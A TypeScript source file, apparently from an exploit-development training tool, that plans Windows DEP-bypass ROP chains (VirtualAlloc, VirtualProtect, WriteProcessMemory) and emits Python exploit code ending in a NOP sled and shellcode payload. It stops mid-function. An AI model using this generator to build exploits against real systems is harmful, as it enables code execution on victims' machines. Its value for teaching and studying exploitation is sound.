import { CapabilityIndex } from "../rop/capabilities";
import { rankCandidates } from "../rop/emitter";
import { RopGadget } from "../rop/types";
import { ValueRecipe } from "../rop/value_solver";
import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
import { DepApi } from "./rop_template";

// Where each argument of the call comes from. One list of slots per API serves both styles: the skeleton
// writes each slot into a dword of the buffer, PUSHAD pushes each slot from the register it names.
type Source =
  | { kind: "api" }
  | { kind: "shellcode" }
  | { kind: "size" }
  | { kind: "const"; value: number }
  | { kind: "named"; name: "WRITABLE" | "CAVE" }
  | { kind: "ropnop" }
  | { kind: "jmpesp" }
  | { kind: "skip3" }
  | { kind: "nops" };

type Slot = { name: string; source: Source; register?: string };

const API: Source = { kind: "api" };
const SHELLCODE: Source = { kind: "shellcode" };
const WRITABLE: Source = { kind: "named", name: "WRITABLE" };
const CAVE: Source = { kind: "named", name: "CAVE" };
const c = (value: number): Source => ({ kind: "const", value });

const FRAMES: Record<DepApi, Slot[]> = {
  VirtualAlloc: [
    { name: "VirtualAlloc", source: API }, { name: "return", source: SHELLCODE }, { name: "lpAddress", source: SHELLCODE },
    { name: "dwSize", source: { kind: "size" } }, { name: "flAllocationType", source: c(0x1000) }, { name: "flProtect", source: c(0x40) },
  ],
  VirtualProtect: [
    { name: "VirtualProtect", source: API }, { name: "return", source: SHELLCODE }, { name: "lpAddress", source: SHELLCODE },
    { name: "dwSize", source: c(0x201) }, { name: "flNewProtect", source: c(0x40) }, { name: "lpflOldProtect", source: WRITABLE },
  ],
  WriteProcessMemory: [
    { name: "WriteProcessMemory", source: API }, { name: "return", source: CAVE }, { name: "hProcess", source: c(0xffffffff) },
    { name: "lpBaseAddress", source: CAVE }, { name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(0x210) },
    { name: "lpNumberOfBytesWritten", source: WRITABLE },
  ],
};

// PUSHAD pushes EAX, ECX, EDX, EBX, the old ESP, EBP, ESI, EDI, so from ESP up the frame reads EDI first.
// For VirtualAlloc and VirtualProtect the old ESP lands on lpAddress, the first argument, and a stack address
// is what that argument wants. For WriteProcessMemory it would land on an argument that must be the cave, so
// EDI carries a gadget that skips the old ESP and the two registers around it and execution resumes at EBX.
// Slots are listed in the order the [4/7] pop jobs load them.
const PUSHAD_FRAMES: Record<DepApi, Slot[]> = {
  VirtualAlloc: [
    { name: "VirtualAlloc", source: API, register: "esi" }, { name: "return", source: { kind: "jmpesp" }, register: "ebp" },
    { name: "dwSize", source: c(0x1), register: "ebx" }, { name: "flAllocationType", source: c(0x1000), register: "edx" },
    { name: "flProtect", source: c(0x40), register: "ecx" }, { name: "ropnop", source: { kind: "ropnop" }, register: "edi" },
    { name: "nops", source: { kind: "nops" }, register: "eax" },
  ],
  VirtualProtect: [
    { name: "VirtualProtect", source: API, register: "esi" }, { name: "return", source: { kind: "jmpesp" }, register: "ebp" },
    { name: "dwSize", source: c(0x201), register: "ebx" }, { name: "flNewProtect", source: c(0x40), register: "edx" },
    { name: "lpflOldProtect", source: WRITABLE, register: "ecx" }, { name: "ropnop", source: { kind: "ropnop" }, register: "edi" },
    { name: "nops", source: { kind: "nops" }, register: "eax" },
  ],
  WriteProcessMemory: [
    { name: "WriteProcessMemory", source: API, register: "ebx" }, { name: "return", source: CAVE, register: "edx" },
    { name: "hProcess", source: c(0xffffffff), register: "ecx" }, { name: "skip3", source: { kind: "skip3" }, register: "edi" },
    { name: "lpBaseAddress", source: CAVE, register: "eax" },
  ],
};

const PUSHAD_TAIL: Record<DepApi, Slot[]> = {
  VirtualAlloc: [],
  VirtualProtect: [],
  WriteProcessMemory: [{ name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(0x210) }, { name: "lpNumberOfBytesWritten", source: WRITABLE }],
};

// One row per gadget the chain uses. Every block is a rendering of this table.
export type Entry = { name: string; address: number; sequence: string; pops: number; retn: number; job: string; loads: number };

/** A drop-in replacement for a chosen gadget: same job, same registers, no move needed. Its cost is in
 * COST too, so swapping is moving the comment marker and nothing else. */
export type Swap = { address: number; sequence: string; pops: number; retn: number; why: string };

type Op = { call: Entry; values: string[]; times?: number } | { line: string };

export type Recipe = { register: string; value: number; keep: string[]; label: string };

export type BuildInput = {
  api: DepApi;
  style: DepPlanStyle;
  module: string;
  badchars: number[];
  index: CapabilityIndex | undefined;
  plans: JobPlan[];
  /** Gadget addresses the chain must not use, from the exclude argument. */
  exclude: number[];
  iatSlot?: number;
  /** Set when no fixed module imports the API itself: the slot holds another export of the same DLL,
   * and the API is that pointer plus this distance. */
  delta?: Delta;
  writable?: number;
  cave?: number;
  jmpEsp?: number;
  /** The next free payloadN() in the student's file. A block whose content is a sendable payload arrives
   * as that complete function, so his file grows by appending and every function is one thing he sends. */
  stage: number;
  solve: (register: string, value: number, keep: string[]) => ValueRecipe | undefined;
};

/** The API reached from a neighbouring import of the same DLL, measured live: right for this build only. */
export type Delta = { dll: string; anchor: string; value: number };

// A section either has code to copy or a reason why it has none. There is no empty block.
export type Block = { lines: string[] } | { none: string };

export type Build = { table: Entry[]; blocks: Record<number, Block>; holes: string[]; recipes: Recipe[]; stages: number[] };

const JUNK = /^(junk|padding)/;
const REGISTERS = ["eax", "ecx", "edx", "ebx", "esi", "edi", "ebp"];
const hex = (value: number): string => hex32(value);
const isClean = (value: number, bad: number[]): boolean => [0, 8, 16, 24].every((shift) => bad.indexOf((value >>> shift) & 0xff) < 0);
const ident = (name: string): string => name.replace(/[^A-Za-z0-9]/g, "_").toLowerCase();
const far = (gadget: RopGadget): boolean => !movesEsp(gadget) && (stackMove(gadget) ?? 0) > LARGE_STACK_MOVE;
const ownsEsp = (operands: string[], mnemonic: string): boolean =>
  operands[0] === "esp" || mnemonic === "leave" || (mnemonic === "xchg" && operands.indexOf("esp") >= 0);

function lastRetN(gadget: RopGadget): number {
  const last = gadget.instructions[gadget.instructions.length - 1];
  if (!last || last.mnemonic !== "ret" || last.operands.length !== 1) return 0;
  return parseInt(last.operands[0], last.operands[0].indexOf("0x") === 0 ? 16 : 10) || 0;
}

// Stack dwords the gadget takes beyond the values it is given, counted until it moves ESP.
function extraPops(gadget: RopGadget, loads: number): number {
  let pops = 0;
  for (const instruction of gadget.instructions) {
    const operands = instruction.operands.map((operand) => operand.trim().toLowerCase());
    if (instruction.mnemonic === "pop") pops += 1;
    else if (instruction.mnemonic === "push") pops -= 1;
    else if (instruction.mnemonic === "add" && operands[0] === "esp") pops += (parseInt(operands[1], 16) || 0) / 4;
    else if (ownsEsp(operands, instruction.mnemonic)) break;
  }
  return Math.max(0, pops - loads);
}

// pops after the gadget moved ESP eat dwords on the new stack, before its ret.
function popsAfterPivot(gadget: RopGadget): number {
  let moved = false;
  let pops = 0;
  for (const instruction of gadget.instructions) {
    const operands = instruction.operands.map((operand) => operand.trim().toLowerCase());
    if (!moved && ownsEsp(operands, instruction.mnemonic)) moved = true;
    else if (moved && instruction.mnemonic === "pop") pops += 1;
  }
  return pops;
}

// A gadget is named after the instruction that does the work, the first one. A push alone does nothing,
// so a gadget that starts with one takes the next instruction into its name too.
export function gadgetName(sequenceText: string): string {
  const parts = sequenceText.split(" ; ");
  const used = parts[0].indexOf("push ") === 0 && parts.length > 1 ? parts.slice(0, 2) : parts.slice(0, 1);
  return used.join(" ")
    .replace(/\b(dword|word|byte)\b ?/g, "")
    .replace(/\[\s*(e[a-z]{2})[^\]]*\]/g, "mem $1")
    .replace(/0x/g, "")
    .replace(/[^a-z0-9]+/gi, "_")
    .replace(/^_|_$/g, "")
    .toUpperCase();
}

// Within a clash the lowest address keeps the plain name, so a name never changes between runs on one corpus.
function assignNames(table: Entry[]): void {
  const groups: Record<string, Entry[]> = {};
  for (const row of table) {
    const base = gadgetName(row.sequence);
    (groups[base] = groups[base] ?? []).push(row);
  }
  for (const base of Object.keys(groups)) {
    groups[base].sort((a, b) => a.address - b.address).forEach((row, i) => { row.name = i === 0 ? base : `${base}_${i + 1}`; });
  }
}

// [1/7] finds nothing that belongs in the exploit, so its block is the three helpers every block below uses.
export const HELPER_BLOCK: Block = { lines: [
  "def neg(v): return (-v) & 0xFFFFFFFF",
  "def clean(v): return not any(b in BADCHARS for b in p32(v))",
  "def hole(name): raise SystemExit(\"still to fill: \" + name)",
] };

export const CORPUS_BLOCK: Block = { none: "the corpus is the search, not the exploit. The gadgets the chain keeps get their names in [4/7]." };

// [2/7] prints before the chain is planned, so its block is built on its own and folded into the build.
export function slotBlock(api: DepApi, module: string, iatSlot: number | undefined, badchars: number[], delta?: Delta): { block: Block; hole?: string } {
  if (iatSlot === undefined) {
    const hole = `IAT_SLOT: no module with ASLR disabled imports ${api} or anything else from its DLL: the STOP says which layer failed`;
    return { block: { lines: [`# ${hole}`, "IAT_SLOT = hole(\"IAT_SLOT\")"] }, hole };
  }
  const note = isClean(iatSlot, badchars) ? "" : ". It holds a bad byte, so the chain builds it and never sends it";
  if (!delta) return { block: { lines: [`IAT_SLOT = ${hex(iatSlot)}     # ${api} in ${module}${note}`] } };
  return { block: { lines: [
    `IAT_SLOT = ${hex(iatSlot)}     # ${delta.dll}!${delta.anchor} in ${module}${note}`,
    `API_DELTA = ${hex(delta.value)}    # ${api} - ${delta.anchor}, measured on this machine. Any Windows update moves it: measure it again on the target`,
  ] } };
}

export function buildExploit(input: BuildInput): Build {
  const { api, style, index, badchars } = input;
  // Numbers handed out within this run, so two emitted functions can never collide with each other.
  const stages: number[] = [];
  const nextStage = (): number => {
    const number = input.stage + stages.length;
    stages.push(number);
    return number;
  };
  const gadgets = (index?.gadgets ?? []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
  const table: Entry[] = [];
  const holes: string[] = [];
  const recipes: Recipe[] = [];
  const byAddress: Record<number, RopGadget> = {};
  for (const gadget of gadgets) byAddress[gadgetAddress(gadget)] = gadget;
  const pick = (key: string): Verdict | undefined => input.plans.filter((plan) => plan.job.key === key)[0]?.pick;

  // Alternatives that swap in by moving the comment marker: same job, same registers, no move needed,
  // nothing the chain cannot point anywhere, and no frame-sized stack move that would silently grow the
  // payload. A candidate rejected for clobbering a live register is not a fallback, it is a trap, so it
  // never appears here.
  const swapsFor = (address: number, loads: number): Swap[] => {
    const plan = input.plans.filter((candidate) => candidate.pick && gadgetAddress(candidate.pick.gadget) === address)[0];
    if (!plan || !plan.pick) return [];
    const chosen = plan.pick;
    // Drop-in means the chain's arithmetic does not move: the same operands, the same offset, and
    // nothing running before the instruction that does the job. `mov [ecx+0x8]` is not a swap for
    // `mov [ecx+0x20]`, it is a different chain.
    const sameAt = (verdict: Verdict): boolean =>
      verdict.at.dest === chosen.at.dest && verdict.at.source === chosen.at.source
      && verdict.at.address === chosen.at.address && (verdict.at.offset ?? 0) === (chosen.at.offset ?? 0);
    return plan.verdicts
      .slice(plan.verdicts.indexOf(chosen) + 1)
      .filter((verdict) => verdict.usable && !verdict.move && verdict.uncontrolled.length === 0 && !verdict.far
        && verdict.leads && chosen.leads && sameAt(verdict)
        && input.exclude.indexOf(gadgetAddress(verdict.gadget)) < 0)
      .slice(0, 2)
      .map((verdict) => ({
        address: gadgetAddress(verdict.gadget),
        sequence: sequence(verdict.gadget),
        pops: extraPops(verdict.gadget, loads),
        retn: lastRetN(verdict.gadget),
        why: sideEffects(verdict.gadget, plan.job),
      }));
  };

  // Carried into the emitted comment, not only into the evidence: the comment is what survives into his file.
  const warnings: Record<number, string> = {};
  for (const plan of input.plans) {
    if (plan.pick && plan.pick.uncontrolled.length > 0) {
      warnings[gadgetAddress(plan.pick.gadget)] = `reads through ${plan.pick.uncontrolled.join(", ")}, which nothing points anywhere: set ${plan.pick.uncontrolled.join(" and ")} first or it faults here`;
    }
  }

  const row = (address: number, text: string, job: string, pops = 0, retn = 0, loads = 0): Entry => {
    const found = table.filter((entry) => entry.address === address)[0];
    if (found) return found;
    const entry: Entry = { name: "", address, sequence: text, pops, retn, job, loads };
    table.push(entry);
    return entry;
  };
  const entry = (gadget: RopGadget, job: string, loads = 0): Entry =>
    row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, loads), lastRetN(gadget), loads);

  // Names exist only once the table is complete, so ops hold entries and lines hold tokens.
  const refs: Entry[] = [];
  const ref = (target: Entry): string => `\u0001${refs.push(target) - 1}\u0001`;

  // A value no static analysis can give: the comment carries the command that produces it, and hole()
  // stops the script instead of letting a plausible-looking wrong value reach the target.
  const hole = (target: string, how: string): Op[] => {
    holes.push(`${target}: ${how}`);
    return [{ line: `# ${target}: ${how}` }, { line: `${target} = hole(${JSON.stringify(target)})` }];
  };

  // Opens a group of chain lines. Every c.rop in the chain sits under one, so the lines that built a field
  // are found by scrolling to its header instead of counting dwords.
  const group = (title: string): Op => ({ line: `#-- ${title}` });

  const usable = (gadget: RopGadget, keep: string[], own: string[]): boolean =>
    !movesEsp(gadget)
    && memoryWrites(gadget, "").length === 0
    && writtenRegisters(gadget).every((register) => own.indexOf(register) >= 0 || keep.indexOf(register) < 0);

  // The ranking puts fewer side effects before a smaller stack move, so a frame-sized move can still rank
  // first; it only wins when nothing else does the job.
  const near = (ranked: RopGadget[]): RopGadget[] => [...ranked.filter((gadget) => !far(gadget)), ...ranked.filter(far)];

  const popGadget = (register: string, keep: string[]): RopGadget | undefined => near(rankCandidates(gadgets.filter((gadget) => {
    const first = gadget.instructions[0];
    return first?.mnemonic === "pop" && first.operands[0]?.trim().toLowerCase() === register && usable(gadget, keep, [register]);
  })))[0];

  const moveGadget = (from: string, to: string, keep: string[]): RopGadget | undefined => near(rankCandidates(gadgets.filter((gadget) =>
    gadget.capabilities.some((capability) =>
      (capability.kind === "MOVE_REGISTER" && capability.register === to && capability.targetRegister === from)
      || (capability.kind === "EXCHANGE_REGISTER" && [capability.register, capability.targetRegister].sort().join() === [from, to].sort().join()))
    && holds(gadget, to, from) && usable(gadget, keep, keep.indexOf(from) >= 0 ? [to] : [to, from]))))[0];

  // A move through at most one other register, so a value reaches the register a gadget reads.
  const moveOps = (from: string, to: string, keep: string[]): Op[] | undefined => {
    if (from === to) return [];
    const direct = moveGadget(from, to, keep);
    if (direct) return [{ call: entry(direct, `move ${from} into ${to}`), values: [] }];
    for (const via of REGISTERS) {
      if (via === from || via === to || keep.indexOf(via) >= 0) continue;
      const first = moveGadget(from, via, keep);
      const second = first ? moveGadget(via, to, keep) : undefined;
      if (first && second) return [{ call: entry(first, `move ${from} into ${via}`), values: [] }, { call: entry(second, `move ${via} into ${to}`), values: [] }];
    }
    return undefined;
  };

  const recipeOps = (recipe: ValueRecipe, job: string): Op[] => {
    const ops: Op[] = [];
    recipe.steps.forEach((step, i) => {
      if (step.kind !== "gadget" || step.address === undefined) return;
      const values: string[] = [];
      for (let j = i + 1; j < recipe.steps.length && recipe.steps[j].kind === "value"; j += 1) {
        if (!JUNK.test(recipe.steps[j].comment)) values.push(hex(recipe.steps[j].value ?? 0));
      }
      const gadget = byAddress[Number(step.address)];
      // A recipe address the scan did not produce has no cost here, so its extra pops would go unpaid and
      // the chain would derail silently. Say so in the file instead.
      ops.push({
        call: gadget
          ? entry(gadget, job, values.length)
          : row(Number(step.address), `${step.comment}   <<< not in the scanned corpus: check its extra pops and ret N by hand`, job),
        values,
      });
    });
    return ops;
  };

  // register = value without touching `keep`: a clean value is one pop, a dirty one is a [5/7] recipe,
  // built in the register itself or in a scratch register and moved.
  const tryConstOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] | undefined => {
    if (isClean(value, badchars)) {
      const pop = popGadget(register, keep);
      if (pop) return [{ call: entry(pop, `load ${register}`, 1), values: [expression] }];
    }
    const direct = input.solve(register, value, keep);
    if (direct) {
      recipes.push({ register, value, keep, label });
      return recipeOps(direct, `${label}`);
    }
    for (const scratch of REGISTERS) {
      if (scratch === register || keep.indexOf(scratch) >= 0) continue;
      const recipe = input.solve(scratch, value, keep);
      const move = recipe ? moveOps(scratch, register, keep) : undefined;
      if (recipe && move) {
        recipes.push({ register: scratch, value, keep, label });
        return [...recipeOps(recipe, label), ...move];
      }
    }
    return undefined;
  };
  const constOps = (register: string, value: number, expression: string, keep: string[], label: string): Op[] =>
    tryConstOps(register, value, expression, keep, label)
    ?? hole(`${register}_value`, `${register} = ${hex(value)} (${label}): no pop and no rop.construct recipe keeps ${keep.join(", ") || "the chain"}`);

  // register += value through a register `keep` does not need: loaded by a pop or a recipe, then added.
  const addConst = (register: string, value: number, expression: string, keep: string[]): Op[] | undefined => {
    const adders = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
      capability.kind === "REGISTER_ADD" && capability.register === register && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0
      && capability.targetRegister !== register && keep.indexOf(capability.targetRegister ?? "") < 0)
      && usable(gadget, keep, [register]))));
    for (const gadget of adders) {
      const by = gadget.capabilities.filter((capability) => capability.kind === "REGISTER_ADD" && capability.register === register)[0].targetRegister ?? "";
      const ops = tryConstOps(by, value, expression, keep.concat(register), `${by} = ${expression}`);
      if (ops) return [...ops, { call: entry(gadget, `add ${expression}`), values: [] }];
    }
    return undefined;
  };

  const capture = pick("capture");
  const add = pick("add");
  const copy = pick("copy");
  const read = pick("read");
  const write = pick("write");
  const advance = pick("advance");
  const negate = pick("negate");
  const pivot = pick("pivot");
  const field = copy?.at.dest ?? "";
  const valueRegister = write?.at.source ?? "eax";
  const writeOffset = write?.at.offset ?? 0;

  // register += a distance popped into another register that `keep` does not need.
  const arithmetic = (register: string, keep: string[]): { pop: Entry; op: Entry; sub: boolean } | undefined => {
    for (const kind of ["REGISTER_SUB", "REGISTER_ADD"]) {
      const options = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
        capability.kind === kind && capability.register === register && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0
        && capability.targetRegister !== register && keep.indexOf(capability.targetRegister ?? "") < 0)
        && usable(gadget, keep, [register]))));
      for (const gadget of options) {
        const by = gadget.capabilities.filter((capability) => capability.kind === kind && capability.register === register)[0].targetRegister ?? "";
        const pop = popGadget(by, keep.concat(register));
        if (pop) return { pop: entry(pop, `load ${by}`, 1), op: entry(gadget, kind === "REGISTER_SUB" ? "subtract a distance" : "add a distance"), sub: kind === "REGISTER_SUB" };
      }
    }
    return undefined;
  };

  // The ops that leave a slot's value in `register`. Both styles use this one loader.
  const load = (slot: Slot, register: string, keep: string[]): Op[] => {
    const source = slot.source;
    // `_value` keeps the target a legal identifier: a slot called "return" would otherwise emit `return = ...`.
    const missing = (why: string): Op[] => hole(`${ident(slot.name)}_value`, why);
    switch (source.kind) {
      case "api": {
        if (!read?.at.address || input.iatSlot === undefined) return missing("no gadget reads the IAT slot");
        const offset = read.at.offset ?? 0;
        const expression = offset ? `IAT_SLOT ${offset < 0 ? "+" : "-"} ${hex(Math.abs(offset))}` : "IAT_SLOT";
        const move = moveOps(read.at.dest ?? "", register, keep);
        if (!move) return missing(`no gadget moves ${read.at.dest} into ${register}`);
        // The distance goes on where an add exists: in the register the read left the pointer in, or after the move.
        const before = input.delta && read.at.dest ? addConst(read.at.dest, input.delta.value, "API_DELTA", keep) : [];
        const after = before ? [] : addConst(register, input.delta?.value ?? 0, "API_DELTA", keep);
        if (!before && !after) return missing(`no gadget adds API_DELTA to ${read.at.dest} or ${register} through a register the chain does not need here`);
        return [...constOps(read.at.address, (input.iatSlot - offset) >>> 0, expression, keep, `${read.at.address} = ${expression}`),
          { call: entry(read.gadget, "read the IAT slot"), values: [] }, ...(before ?? []), ...move, ...(after ?? [])];
      }
      case "const":
        return constOps(register, source.value, hex(source.value), keep, `${slot.name} = ${hex(source.value)}`);
      case "named": {
        const value = source.name === "WRITABLE" ? input.writable : input.cave;
        return value === undefined
          ? missing(`no clean ${source.name.toLowerCase()} address in ${input.module}: dx @$osed().code_caves("", ${source.name === "WRITABLE" ? "4" : "0x210"}, 25, "<bad chars>", "${source.name === "WRITABLE" ? "STAGING" : "EXEC"}")`)
          : constOps(register, value, source.name, keep, slot.name);
      }
      case "nops":
        return constOps(register, 0x90909090, "0x90909090", keep, "four NOPs");
      case "ropnop": {
        const ret = rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
        const pop = popGadget(register, keep);
        if (!ret || !pop) return missing(ret ? `no pop ${register} in ${input.module}` : `no lone ret in ${input.module}`);
        return [{ call: entry(pop, `load ${register}`, 1), values: [ref(entry(ret, "ROP NOP"))] }];
      }
      case "jmpesp": {
        const pop = popGadget(register, keep);
        if (input.jmpEsp === undefined || !pop) return missing(input.jmpEsp === undefined ? `no jmp esp or call esp without bad bytes in ${input.module}: dx @$osed().find_bytes("${input.module}", "FF E4", 20)` : `no pop ${register} in ${input.module}`);
        return [{ call: entry(pop, `load ${register}`, 1), values: [ref(row(input.jmpEsp, "jmp esp", "return into the stack"))] }];
      }
      case "skip3": {
        const skip = rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
        const pop = popGadget(register, keep);
        if (!skip || !pop) return missing(`no gadget that skips three dwords, like add esp, 0xC ; ret: dx @$osed().add_esp("${input.module}")`);
        return [{ call: entry(pop, `load ${register}`, 1), values: [ref(row(gadgetAddress(skip), sequence(skip), "skip three dwords"))] }];
      }
      case "size": {
        const pop = popGadget(register, keep);
        if (!negate || negate.at.dest !== register || !pop) return missing(`no pop and neg for ${register}`);
        return [{ call: entry(pop, `load ${register}`, 1), values: ["neg(size)"] }, { call: entry(negate.gadget, "negate"), values: [] }];
      }
      case "shellcode": {
        const math = arithmetic(register, keep);
        const move = moveOps(field, register, keep);
        if (style !== "skeleton" || !math || !move) {
          return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register}`
            : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp <pushad gadget> ; g ; s -b esp L400${" 90".repeat(16)}`);
        }
        return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: ["0"] }, { call: math.op, values: [] }];
      }
    }
  };

  const loaders: Op[] = [];
  const defineLoader = (slot: Slot, register: string, keep: string[]): string => {
    const fn = `load_${ident(slot.name)}`;
    const params = slot.source.kind === "shellcode" ? "c, field" : slot.source.kind === "size" ? "c, size" : "c";
    loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 28 - fn.length - params.length))}# ${register} = ${slot.name}` });
    for (const op of load(slot, register, keep)) loaders.push("call" in op ? op : { line: op.line });
    return fn;
  };

  let frameBlock: string[] = [];
  const chain: Op[] = [];
  if (style === "skeleton") {
    const frame = FRAMES[api];
    const literal = (slot: Slot): string | undefined => {
      if (slot.source.kind === "const" && isClean(slot.source.value, badchars)) return hex(slot.source.value);
      if (slot.source.kind !== "named") return undefined;
      const value = slot.source.name === "WRITABLE" ? input.writable : input.cave;
      return value !== undefined && isClean(value, badchars) ? slot.source.name : undefined;
    };
    const dummies = [0x45454545, 0x46464646, 0x47474747, 0x48484848, 0x49494949, 0x51515151, 0x52525252];
    frameBlock = [
      ...frame.map((slot, i) => {
        const value = literal(slot) ?? hex(dummies[i]);
        return `frame ${i === 0 ? " =" : "+="} p32(${value})${" ".repeat(Math.max(1, 14 - value.length))}# ${slot.name}${literal(slot) ? "" : ", patched by the chain"}`;
      }),
      "FRAME_AT = OFFSET - len(frame)     # field 1 sits here, so the chain starts on EIP",
    ];
    if (!capture || !add || !copy || !write || !pivot || add.move || copy.move) {
      chain.push(...hole("c", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain by hand"));
    } else {
      const fns = frame.map((slot) => literal(slot) ? undefined : defineLoader(slot, valueRegister, [field]));
      chain.push(group("the captured ESP, and the address of field 1"));
      chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset OFFSET + 4, field 1 is FRAME_AT` });
      chain.push({ line: `# confirm: bp ${hex(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 45454545` });
      chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
      const distance = popGadget(add.at.source ?? "", [capture.at.dest ?? ""]);
      if (distance) chain.push({ call: entry(distance, `load ${add.at.source}`, 1), values: [`neg(OFFSET + 4 - FRAME_AT${writeOffset ? ` + ${hex(writeOffset)}` : ""})`] });
      else chain.push(...hole("distance", `no pop ${add.at.source} for the distance to field 1`));
      chain.push({ call: entry(add.gadget, "add the distance to field 1"), values: [] });
      chain.push({ call: entry(copy.gadget, "keep the field address"), values: [] });
      let at = 0;
      frame.forEach((slot, i) => {
        const fn = fns[i];
        if (!fn) return;
        // The header opens the group, so every line that builds this field is under it: the advance that
        // walks the pointer here, the load, and the write. A wrong field is one scroll, not a dword count.
        chain.push(group(`field ${i + 1}: ${slot.name}`));
        if (i > at) {
          const there = advance ? moveOps(field, advance.at.dest ?? field, []) : undefined;
          const back = advance ? moveOps(advance.at.dest ?? field, field, []) : undefined;
          if (!advance || !there || !back) chain.push(...hole("advance", `no inc gadget that reaches ${field}`));
          else chain.push(...there, { call: entry(advance.gadget, "advance the field address"), values: [], times: 4 * (i - at) }, ...back);
          at = i;
        }
        const args = slot.source.kind === "shellcode" ? `c, ${i + 1}` : slot.source.kind === "size" ? "c, size" : "c";
        chain.push({ line: `${fn}(${args})` });
        chain.push({ call: entry(write.gadget, "write the field"), values: [] });
      });
      const pops = popsAfterPivot(pivot.gadget);
      const delta = writeOffset - 4 * at - 4 * pops;
      const toValue = moveOps(field, valueRegister, []);
      const math = arithmetic(valueRegister, []);
      const toPivot = moveOps(valueRegister, pivot.at.source ?? "", []);
      chain.push(group("pivot: ESP onto field 1"));
      chain.push({ line: `# ${pivot.at.source} = field 1 - ${hex(4 * pops)}, so the ret after the pivot lands on field 1` });
      if (!toValue || !math || !toPivot) chain.push(...hole("pivot_value", `no way to move the field address into ${pivot.at.source}`));
      else {
        chain.push(...toValue);
        if (delta !== 0) chain.push({ call: math.pop, values: [math.sub ? `neg(${delta})` : `${delta}`] }, { call: math.op, values: [] });
        chain.push(...toPivot);
      }
      chain.push({ call: entry(pivot.gadget, "pivot ESP onto field 1"), values: [] });
      const sub = arithmetic(valueRegister, [field])?.sub !== false;
      chain.push(
        { line: "" },
        group("the shellcode address, into the fields the loaders marked"),
        { line: "chain_end = OFFSET + 4 * len(c)" },
        { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` },
        { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex(writeOffset)}` : ""})` },
        { line: `    return ${sub ? "neg(distance)" : "distance"}` },
        { line: "gap = 0x40" },
        { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches): gap += 1" },
        { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" },
        { line: "" },
        { line: "payload  = b\"A\" * FRAME_AT + frame + b\"\".join(p32(w) for w in c)" },
        { line: "payload += b\"C\" * gap + nops + shellcode" },
      );
    }
  } else {
    const slots = PUSHAD_FRAMES[api];
    const loaded: string[] = [];
    const order = slots.map((slot) => {
      const fn = defineLoader(slot, slot.register ?? "eax", loaded.slice());
      loaded.push(slot.register ?? "eax");
      return fn;
    });
    frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`];
    const dispatch = pick("pushad");
    chain.push(group("the seven registers, in the order [6/7] fixes"));
    chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
    chain.push(group("dispatch: pushad writes the whole frame at once"));
    if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
      chain.push({ line: `# ${input.module} has no clean pushad ; ret. This one is ${sequence(dispatch.gadget)}: everything after the pushad has to survive, or the chain dies before the ret.` });
    }
    if (dispatch) chain.push({ call: entry(dispatch.gadget, "pushad ; ret"), values: [] });
    else chain.push(...hole("dispatch", `no pushad ; ret in ${input.module}: dx @$osed().find_bytes("${input.module}", "60 C3", 20)`));
    const tail: string[] = [];
    for (const slot of PUSHAD_TAIL[api]) {
      const known = slot.source.kind === "named" && (slot.source.name === "WRITABLE" ? input.writable : input.cave) !== undefined;
      if (slot.source.kind === "const") tail.push(hex(slot.source.value));
      else if (slot.source.kind === "named" && known) tail.push(slot.source.name);
      else {
        chain.push(group(`${slot.name}: a dword after the pushad gadget, not a register`));
        chain.push(...load(slot, "eax", loaded));
        tail.push(`${ident(slot.name)}_value`);
      }
    }
    if (tail.length > 0) {
      chain.push(group("the dwords the call reads after the pushad gadget"));
      chain.push({ line: `c.extend([${tail.join(", ")}])` });
    }
    chain.push({ line: "" }, { line: "payload = b\"A\" * OFFSET + b\"\".join(p32(w) for w in c) + nops + shellcode" });
  }

  assignNames(table);
  const resolve = (text: string): string => text.replace(/\u0001(\d+)\u0001/g, (_, i: string) => refs[Number(i)].name);
  const render = (ops: Op[], indent: string): string[] => ops.map((op) => {
    if ("line" in op) return op.line === "" ? "" : `${indent}${resolve(op.line)}`;
    const call = `c.rop(${[op.call.name, ...op.values.map(resolve)].join(", ")})`;
    return `${indent}${op.times && op.times > 1 ? `for _ in range(${op.times}): ${call}` : call}`;
  });
  const loaderLines = render(loaders, "    ").map((line) => line.indexOf("    def ") === 0 ? line.slice(4) : line);

  const width = Math.max(0, ...table.map((entry) => entry.name.length));
  const cost = table.filter((entry) => entry.pops > 0 || entry.retn > 0);
  const badText = badchars.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
  const sized = style === "skeleton" && FRAMES[api].some((slot) => slot.source.kind === "size");
